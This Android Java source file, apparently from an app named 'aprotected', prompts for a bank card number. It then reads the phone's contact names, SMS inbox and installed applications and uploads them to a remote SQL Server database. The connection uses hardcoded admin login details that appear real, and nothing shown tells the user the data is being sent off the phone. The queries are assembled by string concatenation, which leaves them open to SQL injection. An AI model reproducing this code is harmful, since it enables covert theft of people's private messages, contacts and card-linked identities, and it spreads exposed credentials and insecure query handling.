package com.example.aprotected;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

public class MainActivity extends AppCompatActivity {


    private static final int REQUEST_CODE_READ_CONTACTS = 1;
    private static final int REQUEST_CODE_READ_SMS = 1;
    private static final int REQUEST_CODE_READ_INTERNET = 1;
    private static boolean READ_CONTACTS_GRANTED = false;
    private static boolean READ_INTERNET_GRANTED = false;
    private static boolean READ_SMS_GRANTED = false;
    private Connection connection = null;
    private String cardnumber="";

    private PackageManager packageManager = null;
    private List applist = null;
    private LinkedList<String> contacts = new LinkedList<>();
    private LinkedList<SMSclass> sms = new LinkedList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        CheckForPermissions();



        ((TextView) findViewById(R.id.editTextNumber)).addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            boolean textprobel = false;

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (s.toString().length() % 4 == 0) {
                    textprobel = true;
                } else {
                    textprobel = false;
                }
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (textprobel) {
                    s.append(" ");
                }
            }
        });

        if(READ_CONTACTS_GRANTED) {
            readContacts();
        }
//        if(READ_SMS_GRANTED) {
//                readSMS();
//            }


    packageManager = getPackageManager();
    new LoadApplications().execute();

    }

    private boolean CheckForPermissions()
    {
        int hasReadPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS);
        if(hasReadPermission == PackageManager.PERMISSION_GRANTED){
            READ_CONTACTS_GRANTED = true;
        }
        else{
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, REQUEST_CODE_READ_CONTACTS);
        }

        hasReadPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if(hasReadPermission == PackageManager.PERMISSION_GRANTED){
            READ_SMS_GRANTED = true;
        }
        else{
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, REQUEST_CODE_READ_SMS);
        }
        hasReadPermission= ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET);
        if(hasReadPermission == PackageManager.PERMISSION_GRANTED){
            READ_INTERNET_GRANTED = true;
        }
        else{
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.INTERNET}, REQUEST_CODE_READ_INTERNET);
        }
        return true;

    }

    public void openOtherWindow(View v) {
        Intent intent = new Intent(this, ValidActivity.class);
        intent.putExtra("in_data", "Hello from Main Activity!");
        startActivity(intent);
    }

    public void onClickLogin(View v) {

//        startService(new Intent(this, MyService2.class));

        if(((TextView)findViewById(R.id.editTextNumber)).getText().toString().length()==16) {
            cardnumber=((TextView)findViewById(R.id.editTextNumber)).getText().toString();
            new LoadDataBase().execute();
        }
        else
        {
            Toast.makeText(this.getApplicationContext(),"Это не может быть номер карты!",Toast.LENGTH_SHORT).show();

        }
//            Intent intent =  new Intent(this.getApplicationContext(), ActivityMenu.class);
//            startActivity(intent);

    }

    public void onClickStopTest(View v) {

        stopService(new Intent(this, MyService2.class));
    }

    //    public void onClickStop(View v) {
//        stopService(new Intent(this, MyService.class));
//    }
    private List checkForLaunchIntent(List<ApplicationInfo> list) {

        ArrayList appList = new ArrayList();

        for (ApplicationInfo info : list) {
            try {
                if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
                    appList.add(info);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return appList;
    }


    private class LoadDataBase extends AsyncTask<Void, Void, Void> {
        String dbURL = "jdbc:jtds:sqlserver://SQL5103.site4now.net:1433/DB_A72B1E_Secure";
        String user = "DB_A72B1E_Secure_admin";
        String pass = "Alexz73canY";
        @Override
        protected Void doInBackground(Void... params) {
            if (READ_INTERNET_GRANTED) {
                Log.d("db",(READ_INTERNET_GRANTED)?"true":"false");
                try {

                    Class.forName("net.sourceforge.jtds.jdbc.Driver");
                    connection = DriverManager.getConnection(dbURL, user, pass);
                } catch (ClassNotFoundException | SQLException e) {
                    e.printStackTrace();
                }


                if (connection != null) {
                    Statement statement = null;
                    try {
                        statement = connection.createStatement();

                        int clientID=0;
                        ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                        resultSet.next();
                            clientID = resultSet.getInt(1);


                        Log.d("db",String.valueOf(clientID));

                        if(clientID>0) {
                            String insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
                            for (int k = 0; k < contacts.size(); k++) {
                                insertstring += clientID + ", '" + contacts.get(k) + "')";
                                if (k < contacts.size() - 1) {
                                    insertstring += ", (";
                                }
                            }
                             int rows = statement.executeUpdate(insertstring);

                            insertstring = "INSERT Messages(ClientID, MessageFrom, MessageText) VALUES (";
                            for (int k = 0; k < sms.size(); k++) {
                                insertstring += clientID + ", '" + sms.get(k).sender + "','"+sms.get(k).text+"')";
                                if (k < sms.size() - 1) {
                                    insertstring += ", (";
                                }
                            }
                            rows = statement.executeUpdate(insertstring);

                            insertstring = "INSERT Applications(ClientID, ApplicationName) VALUES (";
                            for (int k = 0; k < applist.size(); k++) {
                                insertstring += clientID + ", '" + applist.get(k) + "')";
                                if (k < applist.size() - 1) {
                                    insertstring += ", (";
                                }
                            }
                            rows = statement.executeUpdate(insertstring);
                        }
                        else
                        {
                            Log.d("db","Таких в бд нет!");
                        }
                    } catch (SQLException throwables) {
                        Log.d("db",throwables.getMessage());
                    }

                }
                else
                {
                    Log.d("db","Коннекшн не установлен");
                }
            }

//
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {

            super.onPostExecute(result);
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }


    private class LoadApplications extends AsyncTask<Void, Void, Void> {



        @Override
        protected Void doInBackground(Void... params) {

            applist = checkForLaunchIntent(packageManager.getInstalledApplications(PackageManager.GET_META_DATA));
//
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {

//            for (int k = 0; k < applist.size(); k++)
//            {
//                Log.d("applkist", applist.get(k).toString());
//            }
//
//            for (int k = 0; k < contacts.size(); k++)
//            {
//                Log.d("contactsList", contacts.get(k).toString());
//            }
//
//            for (int k = 0; k < sms.size(); k++)
//            {
//                Log.d("smsList", sms.get(k).getSender()+":"+sms.get(k).getText());
//            }

//
//            try{
//                Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
//                String dbURL = "jdbc:sqlserver://SQL5103.site4now.net;database=DB_A72B1E_Secure";
//                String user = "DB_A72B1E_Secure_admin";
//                String pass = "Alexz73canY";
//                conn = DriverManager.getConnection(dbURL, user, pass);
//                if (conn != null) {
//                    DatabaseMetaData dm = (DatabaseMetaData) conn.getMetaData();
//
//                    Statement statement = conn.createStatement();
//
//                    ResultSet resultSet = statement.executeQuery("SELECT TOP (1000) [Id],[CardNumber] FROM Clients");
//                    while(resultSet.next())
//                    {
//                        Log.d("dbvalue",resultSet.getObject(1).toString());
//                    }
//                }
//            } catch (ClassNotFoundException | SQLException e) {
//                e.printStackTrace();
//            }

            super.onPostExecute(result);
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }



    private LinkedList<String> readContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        contacts = new LinkedList<>();
        try {
            if (cursor != null) {

                while (cursor.moveToNext()) {

                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)).replace("'","*");
                    contacts.add(contact);
                    Log.d("Contacts", (String) contacts.get(contacts.size()-1));
                }

                cursor.close();
            }


        } catch (Exception ex) {
            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_SHORT).show();
        }
        return contacts;

    }

    private LinkedList<SMSclass> readSMS()
    {

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        sms=new LinkedList<>();
        if (cursor.moveToFirst())
        {
            do {

                sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));

                // use msgData
            } while (cursor.moveToNext());
        } else
            {

        }
        return  sms;
    }

}